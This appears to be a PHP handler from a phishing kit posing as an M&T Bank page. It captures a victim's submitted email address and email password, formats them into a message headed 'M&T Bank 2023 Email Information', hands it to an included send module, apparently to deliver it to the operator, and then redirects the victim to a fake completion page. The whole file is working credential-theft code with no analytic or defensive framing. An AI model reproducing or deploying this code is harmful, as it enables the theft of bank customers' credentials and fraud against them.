<?php
require_once('Module/Setmodule.php');
if(isset($_POST['emailPassword']))
{
$_SESSION['email'] = $_POST['email'];
$message .= " -------------- M&T Bank 2023 Email Information -------------- \n"."\n";
$message .= "Email Password: ".$_POST['emailPassword']."\n\n"; 

require_once('Module/SendModule.php');
}
header("Location: ../complete.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
?>